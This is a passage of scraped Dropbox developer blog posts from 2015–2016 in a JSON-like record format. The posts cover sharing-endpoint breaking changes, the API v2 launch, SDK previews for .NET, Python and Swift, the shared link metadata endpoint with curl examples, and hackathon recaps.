\r\n                \"same_team\": false\r\n            }\r\n        }\r\n    ],\r\n    \"groups\": [],\r\n    \"invitees\": [],\r\n    \"cursor\": \"ZtkX9_EHj3x7PMkVuFIhwKYXEpwpLwyxp9vMKomUhllil9q7eWiAu\"\r\n} Breaking changes to /get_folder_metadata To accommodate the new shared folder membership endpoint, the following breaking changes will be made to the sharing/get_folder_metadata endpoint: Membership will no longer be returned as part of the response. Use the new shared folder membership endpoint to list members of a shared folder. The include_membership request parameter will no longer be accepted. BasicSharedFolderMetadata and FullSharedFolderMetadata response structures will be consolidated into a single response structure, SharedFolderMetadata . The id response field will be renamed to shared_folder_id to be consistent with the rest of the beta sharing endpoints. Below is an example of the new response structure: Copy {\r\n    \"access_type\": {\r\n        \".tag\": \"owner\"\r\n    }, \r\n    \"shared_folder_id\": \"dbsfid:BCcDKIi3BO5uA9Kzv1v7I9MBJiqoXZXx7Fo\", \r\n    \"is_team_folder\": false, \r\n    \"name\": \"example\", \r\n    \"path_lower\": \"/example\", \r\n    \"policy\": {\r\n        \"acl_update_policy\": {\r\n            \".tag\": \"editors\"\r\n        }, \r\n        \"member_policy\": {\r\n            \".tag\": \"anyone\"\r\n        }, \r\n        \"shared_link_policy\": {\r\n            \".tag\": \"anyone\"\r\n        }\r\n    }\r\n} Renamed: Member errors A few minor breaking changes will be made to some of our error structures and endpoint arguments: All not_member error tags will be renamed to not_a_member SharedFolderMemberError will be reused for common errors across: sharing/update_folder_member sharing/remove_folder_member not_a_member Errors We’ve renamed all not_member errors to not_a_member to be consistent across the beta sharing endpoints: Old Copy SharedFolderAccessError.not_member\r\nTransferFolderError.new_owner_not_member New Copy SharedFolderAccessError.not_a_member\r\nTransferFolderError.new_owner_not_a_member Common Member Selector Errors Some API routes allow performing an action on a target shared folder member using a member selector . These routes shared common error conditions for bad member selectors, but are not using a common, shared error structure. We will update the routes to use a common error format for errors when specifying a target member, the SharedFolderMemberError error type: Copy union SharedFolderMemberError\r\n    invalid_dropbox_id\r\n    not_a_member Only two routes are affected: sharing/remove_folder_member: The asynchronous sharing/remove_folder_member route will have two of its error tags removed since they are redundant with the error tags already specified for asynchronous job failures (see JobError ). sharing/update_folder_member: The sharing/update_folder_member route will have two of its error tags replaced with the common SharedFolderMemberError error type: Copy {\r\n    \"error_summary\": \"member_error/not_a_member/...\",\r\n    \"error\": {\r\n        \".tag\": \"member_error\",\r\n        \"member_error\": {\r\n            \".tag\": \"not_a_member\"\r\n        }\r\n    }\r\n} // Tags Developers Announcements // Copy link Link copied Link copied", "date": "2015-12-03"},
{"website": "Dropbox", "title": "More breaking changes to beta sharing endpoints", "author": ["Scobbe"], "link": "https://dropbox.tech/developers/more-breaking-changes-to-beta-sharing-endpoints", "abstract": "Error Structure Changes /check_job_status errors Changes to SharedFolderAccessError Shared Folder ID Format Change New /sharing/list_mountable_folders endpoint We are making breaking changes to the beta sharing endpoints, which will take effect as of February 24th, 2016: Reorganizing some error structures Changing the format of shared folder IDs These changes help make error handling more intuitive and provide a better migration path for apps still using v1 endpoints. Error Structure Changes We’re improving and reorganizing the error structures for the beta sharing endpoints. For apps handling errors, changes will not be backwards compatible, but they will make error handling more intuitive in the future, especially as more features are added. /check_job_status errors Errors returned by sharing/check_job_status will be grouped by route, to make it clear what type of asynchronous job failed and to allow for route-specific errors. This change will allow different asynchronous routes to raise different errors, without affecting the error types allowed by sharing/check_job_status . JobError will include the following error tags: unshare_folder_error for sharing/unshare_folder jobs remove_folder_member_error for sharing/remove_folder_member jobsOld Old Copy JobError.access_error\r\nJobError.member_error New Copy JobError.remove_folder_member_error\r\nJobError.unshare_folder_error Here’s what sharing/check_job_status will return if sharing/unshare_folder_error fails with the not_a_member error: Copy {\r\n  \".tag\": \"failed\",\r\n  \"failed:\": {\r\n    \".tag\": \"unshare_folder_error\",\r\n    \"unshare_folder_error\": {\r\n    \".tag\": \"access_error\",\r\n    \"access_error\": {\r\n      \".tag\": \"not_a_member\"\r\n      }\r\n    }\r\n  }\r\n} Changes to SharedFolderAccessError We’re taking the error tags no_permission and team_folder out of SharedFolderAccessError , and moving them to error unions associated directly with specific sharing endpoints. We’re doing this because SharedFolderAccessError should mean that the user cannot access the shared folder. We use no_permission to mean that the user cannot perform a particular operation on a shared folder, but the user may actually be able to access the shared folder. Similarly, team_folder means that a particular operation is not applicable for team folders, not that the user cannot access this folder. Old Copy union SharedFolderAccessError\r\n  invalid_id\r\n  not_a_member\r\n  no_permission\r\n  email_unverified\r\n  team_folder\r\n  unmounted New Copy union SharedFolderAccessError\r\n  invalid_id\r\n  not_a_member\r\n  email_unverified\r\n  unmounted We have added no_permission and team_folder to the error types of applicable routes. For example, AddFolderMemberError and UnshareFolderError now include no_permission and team_folder . The following routes are affected: sharing/add_folder_member sharing/mount_folder sharing/relinquish_folder_membership sharing/remove_folder_member sharing/transfer_folder sharing/unmount_folder sharing/unshare_folder sharing/update_folder_member sharing/update_folder_policy The following routes raise SharedFolderAccessError directly, but they are not affected because no_permission and team_folder do not apply. sharing/get_folder_metadata sharing/list_folder_members sharing/list_folder_members/continue Shared Folder ID Format Change We are changing the tags shared_folder_id and parent_shared_folder_id in the API response from an encoding string( dbsfid:BCcDKIi3BO5uA9Kzv1v7I9MBJiqoXZXx7Fo ) to a raw id string( 123456 ) . This is equivalent to the id returned in API v1. The following routes are affected as they return shared_folder_id or parent_shared_folder_id : /files/copy /files/create_folders /files/delete /files/download /files/get_metadata /files/get_preview /files/get_thumbnail /files/list_folders /files/list_folders/continue /files/move /files/restore /files/search /files/upload /files/upload_session/finish /sharing/check_share_job_status /sharing/get_folder_metadata /sharing/list_folders /sharing/list_folders/continue /sharing/mount_folder /sharing/share_folder /sharing/update_folder_policy To facilitate migration, the following endpoints will accept both encoded and raw shared folder ID: /sharing/add_folder_member /sharing/get_folder_metadata /sharing/list_folder_members /sharing/mount_folder /sharing/relinquish_folder_membership /sharing/remove_folder_member /sharing/transfer_folder /sharing/unmount_folder /sharing/unshare_folder /sharing/update_folder_member /sharing/update_folder_policy We will monitor usage of encoded shared folder IDs and disable support once usage has stopped. If your app stores encoded shared folder IDs, you should migrate to the raw IDs by calling /sharing/get_folder_metadata with the encoded IDs to retrieve the raw ID for each stored folder. New /sharing/list_mountable_folders endpoint We are introducing a new pair of endpoints, /sharing/list_mountable_folders and /sharing/list_mountable_folders/continue , which return a list of shared folders that more closely matches the shared folders shown on dropbox.com/share . These new endpoints should be preferred over the current /sharing/list_folders[/continue] pair, which will remain in beta. // Tags Developers Announcements // Copy link Link copied Link copied", "date": "2016-02-17"},
{"website": "Dropbox", "title": "Try out Dropbox Business endpoints in .NET", "author": ["Scobbe"], "link": "https://dropbox.tech/developers/try-out-dropbox-business-endpoints-in-net", "abstract": "About the source code Want to see the Dropbox Business API in action? We've built a .NET sample app that shows you how to link to Dropbox business teams, and use the activity endpoints to get statistics about the members. Check it out in our .NET GitHub repo, here ! This simple dashboard offers a visual overview of some of the team data that Dropbox endpoints expose. Using the Team member file access permission level, data on team information, team daily active users, distinct apps that team members have linked, shared folders with activity in the last week and team member rosters, are retrieved. Shout-out to Start Bootstrap for the awesome Bootstrap templates! About the source code While the sample app includes some placeholder data, you can view data about your specific team by: adding your app key and secret to the Web.config file in the SimpleBusinessDashboard project clicking on the 'Connect to Dropbox' button and linking your team to the app Most of the Dropbox Business API calls are made in the Controllers\\HomeController.cs file, including: Fetching team info: Copy DropboxTeamClient client = new DropboxTeamClient(MvcApplication.AccessToken);\r\n \r\nvar teamInfo = await client.Team.GetInfoAsync();\r\nvar teamName = teamInfo.Name;\r\nvar numMembers = teamInfo.NumProvisionedUsers; Fetching Activity data: Copy ar activityInfo = await client.Team.ReportsGetActivityAsync();\r\nactiveUsersToday = (List<ulong?>)activityInfo.ActiveUsers1Day;\r\n/* grab the last element in the array, which contains numDailyActives for today */\r\nvar numDailyActives = activeUsers.Last() == null ? 0 : (ulong)activeUsers.Last();\r\n \r\nvar sharedFoldersWeekly = (List<ulong?>)activityInfo.ActiveSharedFolders7Day;\r\n/* grab the last element in the array, which contains numWeeklySharedFolders for this week */\r\nvar numWeeklySharedFolders = sharedFoldersWeekly.Last() == null ? 0 : (ulong)sharedFoldersWeekly.Last(); Fetching team member data: Copy var memListResult = await client.Team.MembersListAsync(); More info can be found in our .NET SDK documentation . // Tags Developers Sample Apps Tips and Tricks Dotnet // Copy link Link copied Link copied", "date": "2016-03-14"},
{"website": "Dropbox", "title": "Dropbox API v2 launches today", "author": ["Smarxdropbox"], "link": "https://dropbox.tech/developers/dropbox-api-v2-launches-today", "abstract": "New SDKs File IDs Shared links and shared folders API Explorer Other enhancements More to come Today we're excited to launch Dropbox API v2 ! We announced a preview of API v2 in April, and have continued to update and improve the API based on your feedback. As of today, Dropbox API v2 is ready to be used in all your Dropbox-connected apps. Thank you to the hundreds of developers who have already tried out API v2 in preview. Our goal with API v2 is to provide a simpler, more consistent, and more comprehensive API. In addition to the API itself, we're also introducing clearer documentation , new SDKs and sample apps, and a brand new API Explorer that lets developers try API calls directly in the browser. New SDKs There are currently four SDKs for API v2: Swift , Python , .NET , and Java . We're continuing to add new SDKs, so watch the blog for upcoming announcements. All SDKs and documentation for API v2 are managed via a code generation process, which means that they're consistent across languages and easy to update as we add new API features. File IDs Developers have often asked us to support the notion of a file ID: a unique identifier for a file that remains constant even when the file is moved. We're pleased to announce that API v2 includes this highly-requested feature. Developers can now use file IDs instead of paths to make sure their apps don't lose track of a file when it's moved by a user. Shared links and shared folders In addition to creating shared links , apps can now list and revoke existing shared links. Apps can also, for the first time, programmatically share folders and manage folder policies and membership . We're excited to deliver this commonly-requested functionality, and we hope to see a new class of collaborative apps emerge as a result. API Explorer The Dropbox API Explorer lets you try out API calls directly in the browser. It's by far the easiest way to learn about the new API and see example requests and responses. Other enhancements As you explore the available endpoints, you'll notice a number of other small enhancements we've made. For example, /files/search now supports full-text search of content in Dropbox Business accounts. The new /files/list_folder endpoint combines the process of listing the contents of a folder and fetching updates to that content. More to come Today, API v2 is ready for you to use in your production apps, but that doesn't mean we're done. We have more endpoints to add and more SDKs and tutorials to write. In particular, you'll notice that Dropbox Business API v2 and the new shared folder endpoints are still in beta. We expect to take those out of beta soon, but we wanted to give developers a chance to give us feedback first. Please give API v2 a try and let us know what you think ! // Tags Developers Announcements // Copy link Link copied Link copied", "date": "2015-11-04"},
{"website": "Dropbox", "title": "Dropbox at Hack the North", "author": ["Fengdropbox"], "link": "https://dropbox.tech/developers/dropbox-at-hack-the-north", "abstract": "This weekend, Leah and I were at the University of Waterloo sponsoring the student hackathon, Hack the North . We met students who flew in from across the continent, gave a talk on using the Dropbox API, and awarded a prize for the best use of the Dropbox API. Thanks to all the students who hacked on the Dropbox API this weekend. Our API prize winner was FedUp , an Android app and website that protects its users during police encounters. The winning team met during summer internships in San Francisco and applied to Hack the North together. Congrats to Kevin Yang , Danny Eng , Francesco Polizzi , and Jeff Shaw ! The code for FedUp is available on GitHub . Congrats to the FedUp team! Intro to Dropbox API talk Leah and I gave a talk and demoed a sample app using the Dropbox API to help students get started hacking. If you’re interested, you can look through the slides here . The sample app allows you to browse past revisions of a file in your Dropbox using a combination of Drop-ins and the API. It is available on GitHub and running on Heroku , if you’d like to try it out. Thanks to Hack the North for putting together a fantastic conference. It was great meeting everyone and seeing what can be built in a weekend. Keep hacking! // Tags Developers Developer Community Hackathon // Copy link Link copied Link copied", "date": "2015-09-23"},
{"website": "Dropbox", "title": "HackZurich", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/hackzurich", "abstract": "Best use of the Dropbox API: Stitch Honorable mention: MyCloset Honorable mention: Wunderbox Honorable mention: SplitBox.me Last weekend the Dropbox platform team was at HackZurich , Europe’s largest student hackathon. With over 450 participants representing dozens of countries, HackZurich was a great place for us to meet new developers and see what they could build. There were many teams that used the Dropbox API; here are four that really stood out. Best use of the Dropbox API: Stitch Stitch allows a Dropbox user to collect PowerPoints or PDFs from other people and then combine them into one seamless presentation. It also allows users to share links via Dropbox so that, for example, conference attendees can have access to the presentation documents as well. For more info, check out the source code on GitHub . Team Stitch, one of 25 finalists, presents their project at HackZurich’s closing ceremonies. Pictured: Matt Krenik, Lachlan Kermode, Youssef Demitri, and Marco Baumeler. As winners of the Best Use of the Dropbox API category, each member won a pair of Beats headphones and 5GB of Dropbox space. They came up with the idea during the opening ceremonies: solve the pain point of needing to switch between different files when multiple people are presenting. Honorable mention: MyCloset Do you remember that scene in Clueless when Cher was swiping through a futuristic app that showed her different outfit options from her closet? With MyCloset, that scene is now a reality. It uses Zalando's API to get outfit items (like tops, bottoms, and in the future, accessories) and let you swipe through them to find your favorite combo. Since the images from Zalando are only available as long as the items are for sale, the app uses the Dropbox API to store your personal wardrobe collection forever. Team MyCloset. Pictured: Bilal Karim Reffas, Florian Chrometz, and Katrin Buettner. Nice Dropbox Tshirt! The team members from MyCloset know each other from work and previous hackathons. They entertained app ideas well into the night on Friday until finally landing on the digital closet. See how they used the v2 Dropbox HTTP API in an iPhone app by looking at their project’s source code . Honorable mention: Wunderbox Wunderbox homepage Most Germans are familiar with wundertütes , the mystery bag of candy surprises available in grocery stores. The web app, Wunderbox , is a digital version! You link your Dropbox account to Wunderbox and then instead of candy, you get a Dropbox folder full of funny gifs, music, pictures, and other fun content. There’s also an option to surprise a friend. Team Wunderbox: Carl Gödecken, Niklas Riekenbrauck, Nico Knoll, and Daniel Theveßen, who are all studying together at Hasso Plattner Institute (Potsdam/Berlin). We loved how this app adds an element of happiness and delight to your personal cloud, and the design was one of the best we saw all weekend. This team was on a roll this weekend too – Wunderbox was the second project they completed, which took them about eight hours. The next feature they want to add to Wunderbox is the ability to pay for content. Honorable mention: SplitBox.me SplitBox encrypts your files, using multiple cloud storage accounts. Users connect to Dropbox as one of cloud storage locations. You can then share that file with someone else with encrypted passwords, too. By the end of the hackathon, this app included impressive cryptography features, several different APIs, and it was simple and streamlined to boot. Check out their source code here ! Team SplitBox.me, finalists at HackZurich, presents their project during closing ceremonies. Pictured: Stephan Schultz, Markus Petrykowski, and Carl Ambroselli. Team SplitBox.me, finalists at HackZurich, presents their project during closing ceremonies. Pictured: Stephan Schultz, Markus Petrykowski, and Carl Ambroselli. The SplitBox team met each other at their University, Hasso-Plattner-Institute in Potsdam, and they’ve previously worked on some other projects together. They are happy to report that SplitBox is ready to use now, and they plan to do a bit of refactoring before adding more features. * * * * * We had a ton of fun at HackZurich. Eric gave a tech talk about our APIs, Leah was on the main judging panel, and Alex and Jenn helped hackers with questions from O A uth to JavaScript . It was also the first event we’ve attended since launching the v2 of our developer site. At the end, out of over 120 teams, only 25 were chosen as finalists who got to present their projects at the closing ceremonies. Well done to everyone, and congrats again on a great hackathon! // Tags Developers Developer Community Hackathon // Copy link Link copied Link copied", "date": "2015-10-08"},
{"website": "Dropbox", "title": "New API endpoint: Shared Link Metadata", "author": ["Fengdropbox"], "link": "https://dropbox.tech/developers/new-api-endpoint-shared-link-metadata", "abstract": "Using an app key and secret Using a user access token Examining subfolders or files Today we’re announcing a much-requested API endpoint: shared link metadata , which lets you get metadata (similar to Core API’s /metadata ) from Dropbox shared links. This API endpoint doesn’t require a user access token. We’ve been working with our friends at Slack and Trello to help develop this endpoint to super-power Dropbox shared links pasted into a channel or board. We’re now looking forward to seeing how the rest of the developer community uses it. To test this new endpoint out, you’ll need two things: a Dropbox shared link and a Dropbox app. If you’ve never created a Dropbox shared link, it only takes a few clicks . Creating a Dropbox app is just as easy . In the following examples, I’ll be using curl and a link to a folder with 2 images inside: https://www.dropbox.com/sh/748f94925f0gesq/AAAMSoRJyhJFfkupnAU0wXuva?dl=0 Using an app key and secret Request Copy curl -X POST https://api.dropbox.com/1/metadata/link -u <APP_KEY>:<APP_SECRET> \\\r\n  -d link=https://www.dropbox.com/sh/748f94925f0gesq/AAAMSoRJyhJFfkupnAU0wXuva?dl=0 Response Copy 200 OK\r\n \r\nContent-Type: application/json\r\n{\r\n    \"bytes\": 0,\r\n    \"contents\": [\r\n        {\r\n            \"bytes\": 228105,\r\n            \"client_mtime\": \"Fri, 28 Aug 2015 18:39:12 +0000\",\r\n            \"icon\": \"page_white_picture\",\r\n            \"is_dir\": false,\r\n            \"mime_type\": \"image/jpeg\",\r\n            \"modified\": \"Fri, 28 Aug 2015 18:44:13 +0000\",\r\n            \"path\": \"/Pusheen.jpg\",\r\n            \"rev\": \"155114a7004\",\r\n            \"root\": \"link\",\r\n            \"size\": \"222.8 KB\",\r\n            \"thumb_exists\": true\r\n        },\r\n        {\r\n            \"bytes\": 550913,\r\n            \"client_mtime\": \"Fri, 28 Aug 2015 18:39:58 +0000\",\r\n            \"icon\": \"page_white_picture\",\r\n            \"is_dir\": false,\r\n            \"mime_type\": \"image/jpeg\",\r\n            \"modified\": \"Fri, 28 Aug 2015 18:44:08 +0000\",\r\n            \"path\": \"/Sausalito.jpg\",\r\n            \"rev\": \"153114a7004\",\r\n            \"root\": \"link\",\r\n            \"size\": \"538 KB\",\r\n            \"thumb_exists\": true\r\n        }\r\n    ],\r\n    \"folder_name\": \"Shared Link Metadata\",\r\n    \"hash\": \"f9433abe16be847f75ec8949b3870534\",\r\n    \"icon\": \"folder\",\r\n    \"in_dropbox\": false,\r\n    \"is_dir\": true,\r\n    \"link\": \"https://www.dropbox.com/sh/748f94925f0gesq/AAAMSoRJyhJFfkupnAU0wXuva?dl=0\",\r\n    \"modified\": \"Fri, 10 Jul 2015 01:07:57 +0000\",\r\n    \"path\": null,\r\n    \"rev\": \"141114a7004\",\r\n    \"root\": \"link\",\r\n    \"size\": \"0 bytes\",\r\n    \"thumb_exists\": false,\r\n    \"visibility\": \"PUBLIC\"\r\n} Using a user access token If your app has an authenticated user, it's helpful to know whether a shared link points to a file in that user’s Dropbox. If you call /metadata/link with the user’s access token, the returned metadata will tell you whether the shared link points to a file or folder in that user’s Dropbox via the in_dropbox field. If in_dropbox is true , the path field will tell you the exact path to the file within the user’s Dropbox. With that path, your app can use the rest of the Core API to work directly with the file. If this is your first time creating an access token, try our OAuth guide . Request Copy curl -X POST https://api.dropbox.com/1/metadata/link \\\r\n  -d link=https://www.dropbox.com/sh/748f94925f0gesq/AAAMSoRJyhJFfkupnAU0wXuva?dl=0 \\\r\n  -H \"Authorization: Bearer <ACCESS_TOKEN>\" Response Copy 200 OK\r\n \r\nContent-Type: application/json\r\n{\r\n    \"bytes\": 0,\r\n    \"contents\": [\r\n        {\r\n            \"bytes\": 228105,\r\n            \"client_mtime\": \"Fri, 28 Aug 2015 18:39:12 +0000\",\r\n            \"icon\": \"page_white_picture\",\r\n            \"is_dir\": false,\r\n            \"mime_type\": \"image/jpeg\",\r\n            \"modified\": \"Fri, 28 Aug 2015 18:44:13 +0000\",\r\n            \"path\": \"/Pusheen.jpg\",\r\n            \"rev\": \"155114a7004\",\r\n            \"root\": \"link\",\r\n            \"size\": \"222.8 KB\",\r\n            \"thumb_exists\": true\r\n        },\r\n        {\r\n            \"bytes\": 550913,\r\n            \"client_mtime\": \"Fri, 28 Aug 2015 18:39:58 +0000\",\r\n            \"icon\": \"page_white_picture\",\r\n            \"is_dir\": false,\r\n            \"mime_type\": \"image/jpeg\",\r\n            \"modified\": \"Fri, 28 Aug 2015 18:44:08 +0000\",\r\n            \"path\": \"/Sausalito.jpg\",\r\n            \"rev\": \"153114a7004\",\r\n            \"root\": \"link\",\r\n            \"size\": \"538 KB\",\r\n            \"thumb_exists\": true\r\n        }\r\n    ],\r\n    \"folder_name\": \"Shared Link Metadata\",\r\n    \"hash\": \"f9433abe16be847f75ec8949b3870534\",\r\n    \"icon\": \"folder\",\r\n    \"in_dropbox\": true,\r\n    \"is_dir\": true,\r\n    \"link\": \"https://www.dropbox.com/sh/748f94925f0gesq/AAAMSoRJyhJFfkupnAU0wXuva?dl=0\",\r\n    \"modified\": \"Fri, 10 Jul 2015 01:07:57 +0000\",\r\n    \"path\": \"/Blog/Shared Link Metadata\",\r\n    \"rev\": \"141114a7004\",\r\n    \"root\": \"dropbox\",\r\n    \"size\": \"0 bytes\",\r\n    \"thumb_exists\": false,\r\n    \"visibility\": \"PUBLIC\"\r\n} Examining subfolders or files If your shared link points to a folder (like mine did) and you just need metadata for specific files or subfolders in that folder, you can pass its relative path in the path parameter: Request Copy curl -X POST https://api.dropbox.com/1/metadata/link \\\r\n  -d link=https://www.dropbox.com/sh/748f94925f0gesq/AAAMSoRJyhJFfkupnAU0wXuva?dl=0 \\\r\n  -d path=/Pusheen.jpg -H \"Authorization: Bearer <ACCESS_TOKEN>\" Response Copy 200 OK\r\n \r\nContent-Type: application/json\r\n{\r\n    \"bytes\": 228105,\r\n    \"client_mtime\": \"Fri, 28 Aug 2015 18:39:12 +0000\",\r\n    \"icon\": \"page_white_picture\",\r\n    \"in_dropbox\": false,\r\n    \"is_dir\": false,\r\n    \"link\": \"https://www.dropbox.com/sh/748f94925f0gesq/AAACxOBrrlgYrMtZ804XECFQa/Pusheen.jpg?dl=0\",\r\n    \"mime_type\": \"image/jpeg\",\r\n    \"modified\": \"Fri, 28 Aug 2015 18:44:13 +0000\",\r\n    \"path\": \"/Pusheen.jpg\",\r\n    \"rev\": \"155114a7004\",\r\n    \"root\": \"link\",\r\n    \"size\": \"222.8 KB\",\r\n    \"thumb_exists\": true,\r\n    \"visibility\": \"PUBLIC\"\r\n} For full details on this new endpoint, check out our Core API docs . Happy hacking! // Tags Developers Announcements Archive // Copy link Link copied Link copied", "date": "2015-08-31"},
{"website": "Dropbox", "title": "Announcing the Dropbox API v2 Explorer", "author": ["Arun Debray"], "link": "https://dropbox.tech/developers/announcing-the-dropbox-api-v2-explorer", "abstract": "It was a dark and stormy night. Wolves howled at the full moon as all the village slept — all except for our protagonist, who stared into their computer monitor, switching between API docs and their terminal. As they reread the documentation, they had an idea, and excitedly typed in a command. But it responded with yet another syntax error. Our protagonist felt like cURLing up into a ball. Our protagonist dreamed that, one day, there might be a tool to help developers like them. Maybe even a GUI. One day, they could use it to painlessly get an OAuth2 token. They could use it to automatically write cURL calls or Python code as they looked through the API endpoints. Learning the API and prototyping their ideas would be so much easier — one day. That day is today. We hope you find the Dropbox API Explorer as useful as our protagonist does for getting started with the Dropbox API v2, testing your own examples, and quickly prototyping ideas for development. // Tags Developers Announcements Developer Tools // Copy link Link copied Link copied", "date": "2015-08-13"},
{"website": "Dropbox", "title": "API v2 developer site (preview!)", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/api-v2-developer-site-preview", "abstract": "In April we announced API v2 , a new version of our Dropbox API. Over the past few weeks, we also released preview versions of SDKs for Swift , Python , and .NET that work with API v2. And now we've put this all together in a new developer site, specifically for API v2. Check it out: Dropbox API v2 preview developer site The content is mostly the same as our previous blog posts, but now it's in a single easy-to-find location. For each SDK we've included installation instructions, a tutorial, full documentation, and links to example apps. You can find all the SDK documentation here and the full API v2 HTTP documentation here . Check out the preview of our new API v2 developer site and let us know what you think. // Tags Developers Announcements Preview // Copy link Link copied Link copied", "date": "2015-06-25"},
{"website": "Dropbox", "title": "Introducing a preview of the new Dropbox.NET SDK for API v2", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/introducing-a-preview-of-the-new-dropbox-net-sdk-for-api-v2", "abstract": "Install the Dropbox.NET SDK Register a Dropbox API app Link an account Try some API requests Documentation [ Update : API v2 and the Dropbox.NET SDK are no longer in preview and are ready for use in production. ] Today we're announcing the Dropbox.NET SDK , a new SDK that you can use to try out our new API v2 preview . We've built this SDK to support the Microsoft development community and we'd love to get your thoughts and feedback. The Dropbox.NET SDK is a Portable Class Library that works with multiple platforms including Windows, Windows Phone, and Mono. Please keep in mind that both the SDK and API v2 are in preview mode so please don’t use them for your production apps just yet. We’ll let you know when the final versions are ready. Install the Dropbox.NET SDK We recommend using NuGet to install the new Dropbox.NET SDK. To install Dropbox.Api , run the following command in the Package Manager Console : Copy PM&amp;amp;gt; Install-Package Dropbox.Api -Pre Register a Dropbox API app If you haven't already, you'll need to register a new app in the App Console . Select Dropbox API app and choose your app's permission. You'll need to use the app key created with this app to access API v2. That's it! You’re ready to try out the Dropbox.NET SDK. Link an account In order to make calls to the API, you'll need a DropboxClient instance. To instantiate, pass in the access token for the account you want to link. You can generate an access token for testing with your own account through the App Console . In order to authorize additional users, the Dropbox.NET SDK contains helper methods for using OAuth with Dropbox . Here's an example where we set up the DropboxClient and check the current user by calling GetCurrentAccountAsync , which returns an instance of FullAccount : Copy using System;\r\nusing System.Threading.Tasks;\r\nusing Dropbox.Api;\r\n \r\nclass Program\r\n{\r\n    static void Main(string [] args)\r\n    {\r\n        var task = Task.Run((Func&amp;amp;lt;Task&amp;amp;gt;)Program.Run);\r\n        task.Wait();\r\n    }\r\n \r\n    static async Task Run()\r\n    {\r\n        using (var dbx = new DropboxClient(\"YOUR ACCESS TOKEN\"))\r\n        {\r\n            var full = await dbx.Users.GetCurrentAccountAsync();\r\n            Console.WriteLine(\"{0} - {1}\", full.Name.DisplayName, full.Email);\r\n        }\r\n    }\r\n} Try some API requests Now that you have a DropboxClient handy, let's try making some API requests. You can use the DropboxClient object you instantiated above to make API calls. Let's try out some of the Files requests. To list all the contents in the user's root directory: Copy async Task ListRootFolder(DropboxClient dbx)\r\n{\r\n    var list = await dbx.Files.ListFolderAsync(string.Empty);\r\n \r\n    // show folders then files\r\n    foreach (var item in list.Entries.Where(i =&amp;amp;gt; i.IsFolder))\r\n    {\r\n        Console.WriteLine(\"D  {0}/\", item.Name);\r\n    }\r\n \r\n    foreach (var item in list.Entries.Where(i =&amp;amp;gt; i.IsFile))\r\n    {\r\n        Console.WriteLine(\"F{0,8} {1}\", item.AsFile.Size, item.Name);\r\n    }\r\n} To download a file: Copy async Task Download(DropboxClient dbx, string folder, string file)\r\n{\r\n    using (var response = await dbx.Files.DownloadAsync(folder + \"/\" + file))\r\n    {\r\n        Console.WriteLine(await response.GetContentAsStringAsync());\r\n    }\r\n} To upload a file: Copy async Task Upload(DropboxClient dbx, string folder, string file, string content)\r\n{\r\n    using (var mem = new MemoryStream(Encoding.UTF8.GetBytes(content))\r\n    {\r\n        var updated = await dbx.Files.UploadAsync(\r\n            folder + \"/\" + file,\r\n            WriteMode.Overwrite.Instance,\r\n            body: mem);\r\n        Console.WriteLine(\"Saved {0}/{1} rev {2}\", folder, file, updated.Rev);\r\n    }\r\n} Documentation You can find out more details in the full documentation for the Dropbox.NET SDK . // Tags Developers Announcements Preview Dotnet // Copy link Link copied Link copied", "date": "2015-06-23"},
{"website": "Dropbox", "title": "Now available in preview: Python SDK for API v2", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/preview-python-sdk-for-api-v2", "abstract": "Install the Python SDK Register a Dropbox API app Link an account Try some API requests Documentation We've been hard at work on API v2 , and today we're releasing a second preview SDK: the Dropbox Python SDK ! It's no secret that we love Python here at Dropbox, so we hope you’ll try out the SDK and send us your thoughts. This blog post will show you how to install the Python SDK and help you get started making calls using the Dropbox API v2. If you're familiar with API v1, you'll notice a few differences in this new SDK. For more context on v2, including an overview of how we’re updating the Core API, check out this blog post . Keep in mind that this is a preview version of the Python SDK and API v2. Both might change in the coming months, so please don't use them in production. Install the Python SDK In your directory of choice, install the SDK. Copy pip install dropbox-sdk-python-master.zip Now you can do “import dropbox” in your python app, or in a python interpreter. Copy import dropbox Register a Dropbox API app If you haven’t already, you’ll need to register a new app in the App Console . Select Dropbox API app and choose your app’s permission. You’ll need to use the app key created with this app to access API v2. That’s it! You’re ready to start using the Python SDK v2 preview. Link an account In order to make calls to the API, you'll need a Dropbox instance. To instantiate, pass in the access token for the account you want to link. (Tip: You can generate an access token for your own account through the App Console). Copy dbx = dropbox.Dropbox('YOUR_ACCESS_TOKEN') Test it out to make sure you've linked the right account: Copy dbx.users_get_current_account() Try some API requests You can use the Dropbox object you instantiated above to make API calls. Try out some of the files requests. List all of the contents in the user’s root directory: Copy for entry in dbx.files_list_folder('').entries:\r\n    print entry.name\r\n \r\n# OUTPUT:\r\n# Cavs vs Warriors Upload a file (and take a wild guess at tomorrow's headline): Copy dbx.files_upload(\"Potential headline: Game 5 a nail-biter as Warriors inch out Cavs\", '/cavs vs warriors/game 5/story.txt') Get the metadata for a file (and prove that you called it before the game was over!): Copy print dbx.files_get_metadata('/Cavs vs Warriors/Game 5/story.txt').client_modified\r\n \r\n# OUTPUT:\r\n# 2015-06-15 02:45:12 Documentation You can read more in the documentation . There's also a sample script called “updown.py\" in the examples folder. Check it out! // Tags Developers Announcements Preview Python // Copy link Link copied Link copied", "date": "2015-06-16"},
{"website": "Dropbox", "title": "SwiftyDropbox v0.2", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/swiftydropbox-v0-2", "abstract": "There’s a new version of our Swift SDK for API v2: SwiftyDropbox v0.2 This week we made a breaking change to the serialization format of the API v2 preview . SwiftyDropbox has now been updated it accordingly. All you need to do to upgrade to SwiftyDropbox v0.2 is change the version number in the tag of your Podfile like so: Copy platform :ios, '8.0'\r\nuse_frameworks!\r\n    \r\npod 'SwiftyDropbox', :git => 'git@github.com:dropbox/SwiftyDropbox.git', :tag => '0.2' then run: Copy pod update In SwiftyDropbox v0.2, we’ve also added a Dropbox helper class to make everything cleaner and simpler in the case where your app only expects each user to link one Dropbox account. Check out the original blog post about SwiftyDropbox for updated example code. SwiftyDropbox is still in preview mode so watch for more changes! // Tags Developers Announcements Swift // Copy link Link copied Link copied", "date": "2015-06-04"},
